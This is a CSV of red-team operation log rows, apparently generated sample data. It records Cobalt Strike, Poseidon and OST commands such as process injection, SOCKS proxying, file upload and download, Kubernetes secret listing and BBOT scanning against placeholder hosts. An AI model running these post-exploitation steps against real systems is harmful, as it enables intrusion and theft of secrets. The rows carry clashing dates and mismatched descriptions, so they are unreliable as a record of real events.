entry_identifier,start_date,end_date,source_ip,dest_ip,tool,user_context,command,description,output,comments,operator_name,extra_fields,oplog_id,tags
1318,2024-06-27 22:36:24,2024-06-27 22:36:24.134599,90.201.27.188,66.1.255.186,OST,ipena@lane.com,cd /central/own/Congress,PID: 8994,Failed,Navigating to a directory,Jerry Gonzalez,,,
1319,2023-11-13 12:49:15,2024-03-30 06:34:57,35.14.5.27,66.1.255.186,Cobalt Strike,ipena@lane.com,shinject 12473 x64 /growth.bin,PID 31000,Failed,Attempting process injection,Jerry Gonzalez,,,
1320,2023-08-05 11:44:02,2023-11-12 05:35:45,35.14.5.27,149.55.234.226,Poseidon,ipena@lane.com,sleep 19,"PID 2266, Callback 86",Failed,Sleeping a beacon,Alexander Kim,,,
1321,2023-08-13 02:03:51,2023-11-18 01:23:02,35.14.5.27,66.1.255.186,Poseidon,afranklin@harrison.com,"upload {""file_id"":""08e79d0c-a8bf-4aa4-9263-383cf434e398"",""remote_path""/night/any.gif"",""overwrite"":false}","PID 15761, Callback 54",Failed,Attempting to upload a file,Jerry Gonzalez,,,
1322,2023-09-13 22:15:34,2023-10-20 19:56:18,90.201.27.188,55.167.201.151,OST,alopez@dawson.com,ls,PID: 13028,Failed,Listing files and directories,Alexander Kim,,,
1323,2023-12-04 15:16:01,2024-03-06 07:11:34,35.14.5.27,55.167.201.151,Poseidon,ipena@lane.com,"socks {""action"":""start"",""port"":43562}","PID 352, Callback 31",Success,Attempting to start a SOCKS proxy,Jerry Gonzalez,,,
1324,2024-06-17 00:14:21,2024-06-17 00:14:21.497350,148.64.118.11,149.55.234.226,Cobalt Strike,alopez@dawson.com,upload /first/so.html,PID 20381,Success,Attempting a file upload,Alexander Kim,,,
1325,2024-03-24 20:22:50,2024-03-31 04:10:02,116.163.112.137,149.55.234.226,Poseidon,ipena@lane.com,pty ./kubectl get secrets,"PID 25998, Callback 68",Failed,Conducting container discovery,Alexander Kim,,,
1326,2023-11-09 00:19:46,2023-11-13 16:52:23,148.64.118.11,66.1.255.186,Poseidon,ipena@lane.com,pty whoami,"PID 31096, Callback 44",Success,Obtaining user context,Manuel Chase,,,
1327,2023-12-10 21:25:10,2024-01-02 02:27:58,90.201.27.188,66.1.255.186,OST,afranklin@harrison.com,ls,PID: 13028,Failed,Listing files and directories,Alexander Kim,,,
1328,2024-03-01 00:09:51,2024-03-28 00:40:34,90.201.27.188,149.55.234.226,Poseidon,afranklin@harrison.com,pty kubectl get namespaces,"PID 4839, Callback 49",Failed,Conducting container discovery,Jerry Gonzalez,,,
1329,2024-01-09 05:50:23,2024-02-22 09:21:36,35.14.5.27,55.167.201.151,Poseidon,ipena@lane.com,"socks {""action"":""start"",""port"":43562}","PID 352, Callback 31",Failed,Attempting to start a SOCKS proxy,Jerry Gonzalez,,,
1330,2023-09-08 23:59:04,2024-02-25 16:18:09,116.163.112.137,149.55.234.226,Cobalt Strike,afranklin@harrison.com,sleep 7,PID 3213,Success,Sleeping a beacon,Manuel Chase,,,
1331,2024-07-03 08:01:44,2024-07-03 08:01:44.903705,35.14.5.27,66.1.255.186,Poseidon,afranklin@harrison.com,pty ./kubectl can-i create pod,"PID 24662, Callback 22",Failed,Conducting container discovery,Manuel Chase,,,
1332,2023-08-24 12:28:05,2024-01-13 18:42:25,116.163.112.137,66.1.255.186,Cobalt Strike,alopez@dawson.com,spawn x64 HTTPS,PID 2061,Failed,Spawning a new beacon,Manuel Chase,,,
1333,2023-08-17 22:54:21,2024-02-23 20:50:30,35.14.5.27,55.167.201.151,Cobalt Strike,afranklin@harrison.com,inject-assembly 10023 /during/window.exe,PID 29523,Success,Injecting assembly into a process,Jerry Gonzalez,,,
1334,2023-10-23 03:31:22,2023-12-31 02:57:34,148.64.118.11,149.55.234.226,Cobalt Strike,afranklin@harrison.com,execute-assembly /pick/occur.exe,PID 10850,Failed,Running a local .NET executable,Manuel Chase,,,
1335,2023-11-12 18:49:10,2024-03-15 00:37:58,148.64.118.11,149.55.234.226,Cobalt Strike,alopez@dawson.com,cd /policy/fear/yourself,PID 14828,Success,Navigating to a directory,Manuel Chase,,,
1336,2024-02-10 04:48:54,2024-03-22 11:53:56,90.201.27.188,66.1.255.186,OST,afranklin@harrison.com,download /Congress/fund.docx,PID: 5215,Failed,Downloading a file,Manuel Chase,,,
1337,2023-11-16 22:54:19,2024-03-29 13:37:30,35.14.5.27,149.55.234.226,Poseidon,ipena@lane.com,pty ./kubectl get pods,"PID 2804, Callback 6",Failed,Conducting container discovery,Alexander Kim,,,
1338,2023-08-13 15:38:21,2024-03-30 04:27:04,90.201.27.188,149.55.234.226,OST,alopez@dawson.com,ls,PID: 13028,Success,Listing files and directories,Manuel Chase,,,
1339,2023-12-07 05:45:19,2023-12-13 13:29:22,35.14.5.27,66.1.255.186,Cobalt Strike,afranklin@harrison.com,spawnto x64 /glass/involve/speak/kind.docx,PID 14588,Success,Selecting executable for post-exploitation jobs,Manuel Chase,,,
1340,2024-05-08 08:52:01,2024-05-10 19:12:07,148.64.118.11,66.1.255.186,Poseidon,afranklin@harrison.com,pty ./kubectl get secrets,"PID 25998, Callback 68",Failed,Conducting container discovery,Alexander Kim,,,
1341,2023-12-09 14:13:18,2024-04-12 12:31:06,148.64.118.11,55.167.201.151,OST,ipena@lane.com,ls,PID: 13028,Failed,Listing files and directories,Jerry Gonzalez,,,
1342,2024-05-31 08:45:47,2024-05-31 08:45:47.042569,148.64.118.11,66.1.255.186,OST,alopez@dawson.com,cd /central/own/Congress,PID: 8994,Failed,Navigating to a directory,Manuel Chase,,,
1343,2023-09-26 15:33:05,2024-04-14 16:51:17,90.201.27.188,66.1.255.186,Poseidon,afranklin@harrison.com,pty ./kubectl get pods,"PID 2804, Callback 6",Failed,Conducting container discovery,Jerry Gonzalez,,,
1344,2024-03-05 19:10:16,2024-04-30 13:04:47,148.64.118.11,55.167.201.151,OST,ipena@lane.com,ls,PID: 13028,Success,Listing files and directories,Manuel Chase,,,
1345,2023-12-27 22:48:53,2024-01-07 13:20:11,35.14.5.27,149.55.234.226,Cobalt Strike,alopez@dawson.com,upload /first/so.html,PID 20381,Success,Attempting a file upload,Alexander Kim,,,
1346,2023-12-06 22:23:29,2024-03-13 22:01:39,148.64.118.11,149.55.234.226,OST,alopez@dawson.com,ls,PID: 13028,Success,Listing files and directories,Jerry Gonzalez,,,
1347,2023-09-11 22:58:13,2024-01-06 09:32:09,116.163.112.137,55.167.201.151,OST,alopez@dawson.com,cd /central/own/Congress,PID: 8994,Success,Navigating to a directory,Jerry Gonzalez,,,
1348,2024-03-26 15:26:00,2024-04-27 09:10:37,35.14.5.27,55.167.201.151,Cobalt Strike,afranklin@harrison.com,shinject 12473 x64 /growth.bin,PID 31000,Failed,Attempting process injection,Jerry Gonzalez,,,
1349,2023-08-29 22:55:22,2023-09-30 05:56:30,35.14.5.27,66.1.255.186,Cobalt Strike,alopez@dawson.com,pwd,PID 18794,Success,Obtaining current working directory,Manuel Chase,,,
1350,2024-04-16 12:53:17,2024-04-29 23:00:36,148.64.118.11,55.167.201.151,OST,alopez@dawson.com,python3 CloudScraper.py -u thomas.com >> /build/add.txt,PID: 3148,Failed,Navigating to a directory,Alexander Kim,,,
1351,2024-05-21 09:15:02,2024-05-21 09:15:02.915770,148.64.118.11,55.167.201.151,OST,ipena@lane.com,bbot -t stephens.com-m nmap,PID: 22204,Success,Using BBOT port scan,Manuel Chase,,,
1352,2023-12-15 22:47:10,2024-01-20 18:29:52,35.14.5.27,55.167.201.151,Poseidon,ipena@lane.com,pty curl,"PID 5852, Callback 25",Failed,Attempting to use cURL,Manuel Chase,,,
1353,2024-05-03 04:27:40,2024-05-09 19:49:42,116.163.112.137,55.167.201.151,Cobalt Strike,afranklin@harrison.com,upload /first/so.html,PID 20381,Success,Attempting a file upload,Alexander Kim,,,
1354,2023-08-17 21:32:35,2024-01-21 20:45:52,148.64.118.11,66.1.255.186,OST,alopez@dawson.com,cd /central/own/Congress,PID: 8994,Success,Navigating to a directory,Manuel Chase,,,
1355,2024-04-13 12:27:33,2024-04-13 22:18:14,148.64.118.11,66.1.255.186,Poseidon,alopez@dawson.com,getenv,"PID 18369, Callback 13",Success,Attempting to get environment variables,Manuel Chase,,,
1356,2024-02-08 12:53:02,2024-05-09 03:53:27,35.14.5.27,149.55.234.226,Poseidon,ipena@lane.com,sleep 19,"PID 2266, Callback 86",Failed,Sleeping a beacon,Jerry Gonzalez,,,
1357,2023-09-28 07:33:22,2023-10-09 07:28:17,90.201.27.188,66.1.255.186,Cobalt Strike,ipena@lane.com,execute-assembly /pick/occur.exe,PID 10850,Failed,Running a local .NET executable,Manuel Chase,,,
1358,2024-06-05 06:10:21,2024-06-05 06:10:21.769336,116.163.112.137,149.55.234.226,OST,ipena@lane.com,bbot -t stephens.com-m nmap,PID: 22204,Failed,Using BBOT port scan,Jerry Gonzalez,,,
1359,2024-03-16 21:24:22,2024-03-19 11:10:34,116.163.112.137,149.55.234.226,Cobalt Strike,alopez@dawson.com,execute-assembly /pick/occur.exe,PID 10850,Success,Running a local .NET executable,Jerry Gonzalez,,,
1360,2023-10-04 08:59:38,2024-04-23 09:13:36,35.14.5.27,66.1.255.186,Poseidon,afranklin@harrison.com,pty curl,"PID 5852, Callback 25",Failed,Attempting to use cURL,Alexander Kim,,,
1361,2023-08-02 15:32:02,2023-10-16 08:42:26,35.14.5.27,66.1.255.186,Cobalt Strike,afranklin@harrison.com,spawnto x64 /glass/involve/speak/kind.docx,PID 14588,Success,Selecting executable for post-exploitation jobs,Manuel Chase,,,
1362,2023-09-03 12:23:56,2023-10-26 00:59:56,90.201.27.188,66.1.255.186,Poseidon,ipena@lane.com,pty ./kubectl can-i create pod,"PID 24662, Callback 22",Failed,Conducting container discovery,Alexander Kim,,,
1363,2023-09-04 05:02:38,2024-04-17 05:24:15,35.14.5.27,149.55.234.226,Poseidon,alopez@dawson.com,pty ./kubectl get secrets,"PID 25998, Callback 68",Success,Conducting container discovery,Manuel Chase,,,
1364,2024-04-02 23:27:45,2024-04-12 19:23:37,35.14.5.27,66.1.255.186,Cobalt Strike,afranklin@harrison.com,spawn x64 HTTPS,PID 2061,Success,Spawning a new beacon,Manuel Chase,,,
1365,2023-10-22 21:42:11,2024-05-10 14:36:06,90.201.27.188,55.167.201.151,Poseidon,alopez@dawson.com,pty ./kubectl can-i create pod,"PID 24662, Callback 22",Failed,Conducting container discovery,Jerry Gonzalez,,,
1366,2023-10-03 16:02:42,2024-02-20 19:13:22,90.201.27.188,55.167.201.151,Cobalt Strike,afranklin@harrison.com,pwd,PID 18794,Success,Obtaining current working directory,Jerry Gonzalez,,,
1367,2024-01-28 10:44:09,2024-03-14 11:25:41,35.14.5.27,55.167.201.151,Cobalt Strike,afranklin@harrison.com,cd /policy/fear/yourself,PID 14828,Success,Navigating to a directory,Alexander Kim,,,
1368,2023-12-19 12:24:27,2024-02-17 04:54:57,35.14.5.27,55.167.201.151,Poseidon,afranklin@harrison.com,pty ./kubectl get secrets,"PID 25998, Callback 68",Failed,Conducting container discovery,Jerry Gonzalez,,,
1369,2023-08-15 21:44:59,2023-10-27 19:49:10,148.64.118.11,149.55.234.226,OST,ipena@lane.com,sleep 3,PID: 8087,Success,Sleeping a beacon,Alexander Kim,,,
1370,2024-01-16 23:07:08,2024-04-11 14:26:33,148.64.118.11,149.55.234.226,Poseidon,ipena@lane.com,pty ./kubectl get secrets,"PID 25998, Callback 68",Success,Conducting container discovery,Alexander Kim,,,
1371,2023-07-25 03:10:59,2024-05-05 23:56:23,116.163.112.137,149.55.234.226,OST,alopez@dawson.com,download /Congress/fund.docx,PID: 5215,Success,Downloading a file,Manuel Chase,,,
1372,2023-08-16 11:32:49,2024-02-17 21:36:14,90.201.27.188,66.1.255.186,OST,ipena@lane.com,ls,PID: 13028,Success,Listing files and directories,Alexander Kim,,,
1373,2023-12-19 20:42:14,2024-04-05 20:24:18,148.64.118.11,55.167.201.151,OST,ipena@lane.com,ls,PID: 13028,Success,Listing files and directories,Jerry Gonzalez,,,
1374,2024-05-28 05:03:22,2024-05-28 05:03:22.346237,35.14.5.27,149.55.234.226,Cobalt Strike,ipena@lane.com,execute-assembly /pick/occur.exe,PID 10850,Success,Running a local .NET executable,Manuel Chase,,,
1375,2024-03-27 01:36:36,2024-04-28 20:34:28,90.201.27.188,55.167.201.151,OST,alopez@dawson.com,ls,PID: 13028,Success,Listing files and directories,Jerry Gonzalez,,,
1376,2023-12-29 09:51:10,2024-03-08 09:53:21,90.201.27.188,149.55.234.226,Cobalt Strike,alopez@dawson.com,pwd,PID 18794,Success,Obtaining current working directory,Manuel Chase,,,
1377,2024-03-11 01:28:47,2024-04-12 05:36:32,148.64.118.11,149.55.234.226,OST,alopez@dawson.com,sleep 3,PID: 8087,Success,Sleeping a beacon,Manuel Chase,,,
1378,2024-01-14 23:19:16,2024-03-12 10:10:33,116.163.112.137,149.55.234.226,OST,ipena@lane.com,cd /central/own/Congress,PID: 8994,Failed,Navigating to a directory,Jerry Gonzalez,,,
1379,2024-02-13 20:18:23,2024-04-20 06:09:40,35.14.5.27,66.1.255.186,Poseidon,ipena@lane.com,"socks {""action"":""start"",""port"":43562}","PID 352, Callback 31",Success,Attempting to start a SOCKS proxy,Manuel Chase,,,
1380,2023-09-11 16:09:10,2024-03-05 17:50:03,35.14.5.27,149.55.234.226,OST,ipena@lane.com,ls,PID: 13028,Success,Listing files and directories,Manuel Chase,,,
1381,2024-01-24 02:08:03,2024-01-27 06:19:47,90.201.27.188,149.55.234.226,OST,alopez@dawson.com,bbot -t stephens.com-m nmap,PID: 22204,Failed,Using BBOT port scan,Manuel Chase,,,
1382,2024-05-01 03:38:35,2024-05-09 15:34:57,116.163.112.137,66.1.255.186,Poseidon,alopez@dawson.com,pty ./kubectl can-i create pod,"PID 24662, Callback 22",Success,Conducting container discovery,Alexander Kim,,,
1383,2024-06-29 17:08:58,2024-06-29 17:08:58.299086,116.163.112.137,149.55.234.226,Cobalt Strike,afranklin@harrison.com,execute-assembly /pick/occur.exe,PID 10850,Failed,Running a local .NET executable,Alexander Kim,,,
1384,2024-03-04 07:22:03,2024-05-04 08:18:49,35.14.5.27,66.1.255.186,Cobalt Strike,ipena@lane.com,execute-assembly /pick/occur.exe,PID 10850,Success,Running a local .NET executable,Manuel Chase,,,
1385,2024-05-28 16:31:10,2024-05-28 16:31:10.079966,90.201.27.188,66.1.255.186,Cobalt Strike,alopez@dawson.com,pwd,PID 18794,Success,Obtaining current working directory,Jerry Gonzalez,,,
1386,2023-11-17 01:20:53,2024-01-09 11:33:45,35.14.5.27,149.55.234.226,OST,alopez@dawson.com,bbot -t bowman.com-f safe -ef passive,PID: 20292,Success,Using BBOT safe and passive modules,Manuel Chase,,,
1387,2024-04-28 16:08:29,2024-05-01 07:44:56,148.64.118.11,66.1.255.186,Poseidon,ipena@lane.com,pty ./kubectl get secrets,"PID 25998, Callback 68",Failed,Conducting container discovery,Manuel Chase,,,
1388,2024-02-19 01:12:12,2024-02-22 17:44:43,90.201.27.188,55.167.201.151,Poseidon,alopez@dawson.com,pty ./kubectl can-i create pod,"PID 24662, Callback 22",Success,Conducting container discovery,Jerry Gonzalez,,,
1389,2023-12-28 15:46:54,2024-03-27 02:08:08,90.201.27.188,55.167.201.151,OST,alopez@dawson.com,cd /central/own/Congress,PID: 8994,Success,Navigating to a directory,Alexander Kim,,,
1390,2024-02-19 16:30:48,2024-04-02 15:05:13,90.201.27.188,55.167.201.151,Poseidon,ipena@lane.com,pty curl,"PID 5852, Callback 25",Failed,Attempting to use cURL,Jerry Gonzalez,,,
1391,2023-08-26 09:37:06,2024-03-13 13:06:26,148.64.118.11,55.167.201.151,Poseidon,afranklin@harrison.com,pty ./kubectl get secrets,"PID 25998, Callback 68",Failed,Conducting container discovery,Manuel Chase,,,
1392,2024-06-11 16:48:41,2024-06-11 16:48:41.942991,90.201.27.188,149.55.234.226,Cobalt Strike,alopez@dawson.com,cd /policy/fear/yourself,PID 14828,Failed,Navigating to a directory,Jerry Gonzalez,,,
1393,2023-12-09 08:23:26,2024-03-24 16:35:31,148.64.118.11,66.1.255.186,Poseidon,ipena@lane.com,pty ./kubectl get pods,"PID 2804, Callback 6",Success,Conducting container discovery,Alexander Kim,,,
1394,2024-01-26 03:02:29,2024-02-02 17:45:23,116.163.112.137,66.1.255.186,Poseidon,afranklin@harrison.com,pty curl,"PID 5852, Callback 25",Success,Attempting to use cURL,Jerry Gonzalez,,,
1395,2024-01-22 14:46:24,2024-04-14 02:31:39,116.163.112.137,55.167.201.151,Cobalt Strike,alopez@dawson.com,pwd,PID 18794,Success,Obtaining current working directory,Alexander Kim,,,
1396,2023-09-14 13:05:47,2024-01-05 23:33:36,148.64.118.11,149.55.234.226,Poseidon,alopez@dawson.com,"socks {""action"":""start"",""port"":43562}","PID 352, Callback 31",Failed,Attempting to start a SOCKS proxy,Alexander Kim,,,
1397,2024-05-22 17:38:43,2024-05-22 17:38:43.411662,148.64.118.11,55.167.201.151,Cobalt Strike,ipena@lane.com,sleep 7,PID 3213,Success,Sleeping a beacon,Alexander Kim,,,
1398,2023-09-30 07:46:44,2024-03-17 10:38:20,148.64.118.11,66.1.255.186,Cobalt Strike,ipena@lane.com,inject-assembly 10023 /during/window.exe,PID 29523,Success,Injecting assembly into a process,Alexander Kim,,,
1399,2023-10-11 14:21:35,2023-11-05 06:56:05,90.201.27.188,149.55.234.226,Cobalt Strike,alopez@dawson.com,inject-assembly 10023 /during/window.exe,PID 29523,Failed,Injecting assembly into a process,Jerry Gonzalez,,,
1400,2023-09-23 05:50:47,2024-01-11 14:43:58,116.163.112.137,149.55.234.226,OST,ipena@lane.com,python3 CloudScraper.py -u thomas.com >> /build/add.txt,PID: 3148,Success,Navigating to a directory,Manuel Chase,,,
1401,2024-04-17 03:46:13,2024-05-05 07:23:53,116.163.112.137,149.55.234.226,Poseidon,alopez@dawson.com,"socks {""action"":""start"",""port"":43562}","PID 352, Callback 31",Failed,Attempting to start a SOCKS proxy,Alexander Kim,,,
1402,2024-01-25 02:34:57,2024-03-19 04:04:32,116.163.112.137,55.167.201.151,OST,ipena@lane.com,bbot -t stephens.com-m nmap,PID: 22204,Success,Using BBOT port scan,Manuel Chase,,,
1403,2024-03-25 09:03:03,2024-04-15 21:43:04,90.201.27.188,149.55.234.226,OST,afranklin@harrison.com,cd /central/own/Congress,PID: 8994,Failed,Navigating to a directory,Jerry Gonzalez,,,
1404,2023-10-05 09:33:35,2023-12-06 15:10:40,35.14.5.27,149.55.234.226,Poseidon,ipena@lane.com,pty ./kubectl get pods,"PID 2804, Callback 6",Success,Conducting container discovery,Alexander Kim,,,
1405,2024-04-28 10:21:50,2024-04-30 09:15:26,90.201.27.188,55.167.201.151,Poseidon,alopez@dawson.com,pty kubectl get namespaces,"PID 4839, Callback 49",Success,Conducting container discovery,Jerry Gonzalez,,,
1406,2024-01-27 17:59:51,2024-03-28 16:02:06,116.163.112.137,55.167.201.151,Poseidon,ipena@lane.com,pty kubectl get namespaces,"PID 4839, Callback 49",Failed,Conducting container discovery,Manuel Chase,,,
1407,2023-08-04 01:06:12,2023-08-29 18:34:04,35.14.5.27,149.55.234.226,Cobalt Strike,ipena@lane.com,cd /policy/fear/yourself,PID 14828,Failed,Navigating to a directory,Manuel Chase,,,
1408,2024-06-15 03:50:31,2024-06-15 03:50:31.309620,116.163.112.137,66.1.255.186,Poseidon,alopez@dawson.com,pty ./kubectl get pods,"PID 2804, Callback 6",Success,Conducting container discovery,Jerry Gonzalez,,,
1409,2024-02-03 10:16:31,2024-02-18 08:22:31,148.64.118.11,55.167.201.151,OST,ipena@lane.com,bbot -t bowman.com-f safe -ef passive,PID: 20292,Success,Using BBOT safe and passive modules,Alexander Kim,,,
1410,2024-06-15 12:00:15,2024-06-15 12:00:15.628083,148.64.118.11,66.1.255.186,Poseidon,afranklin@harrison.com,"socks {""action"":""start"",""port"":43562}","PID 352, Callback 31",Success,Attempting to start a SOCKS proxy,Alexander Kim,,,
1411,2024-02-29 03:33:54,2024-04-12 22:34:32,90.201.27.188,66.1.255.186,Poseidon,afranklin@harrison.com,pty curl,"PID 5852, Callback 25",Failed,Attempting to use cURL,Manuel Chase,,,
1412,2023-11-21 03:05:28,2024-04-01 08:30:52,90.201.27.188,66.1.255.186,Cobalt Strike,ipena@lane.com,spawnto x64 /glass/involve/speak/kind.docx,PID 14588,Failed,Selecting executable for post-exploitation jobs,Alexander Kim,,,
1413,2023-10-02 12:44:11,2024-04-10 07:31:07,35.14.5.27,149.55.234.226,OST,alopez@dawson.com,python3 CloudScraper.py -u thomas.com >> /build/add.txt,PID: 3148,Success,Navigating to a directory,Manuel Chase,,,
1414,2023-10-28 02:17:58,2023-11-11 03:10:28,116.163.112.137,149.55.234.226,OST,alopez@dawson.com,cd /central/own/Congress,PID: 8994,Failed,Navigating to a directory,Manuel Chase,,,
1415,2023-12-14 09:35:49,2024-03-21 03:11:29,116.163.112.137,55.167.201.151,Cobalt Strike,alopez@dawson.com,shinject 12473 x64 /growth.bin,PID 31000,Failed,Attempting process injection,Jerry Gonzalez,,,
1416,2023-08-29 08:49:45,2023-12-23 02:24:24,90.201.27.188,149.55.234.226,Poseidon,alopez@dawson.com,"upload {""file_id"":""08e79d0c-a8bf-4aa4-9263-383cf434e398"",""remote_path""/night/any.gif"",""overwrite"":false}","PID 15761, Callback 54",Success,Attempting to upload a file,Alexander Kim,,,
1417,2024-04-10 07:06:44,2024-04-29 02:28:05,35.14.5.27,55.167.201.151,OST,alopez@dawson.com,python3 CloudScraper.py -u thomas.com >> /build/add.txt,PID: 3148,Failed,Navigating to a directory,Jerry Gonzalez,,,
1418,2023-08-24 07:24:20,2024-02-06 03:59:02,148.64.118.11,55.167.201.151,Cobalt Strike,ipena@lane.com,spawnto x64 /glass/involve/speak/kind.docx,PID 14588,Failed,Selecting executable for post-exploitation jobs,Manuel Chase,,,
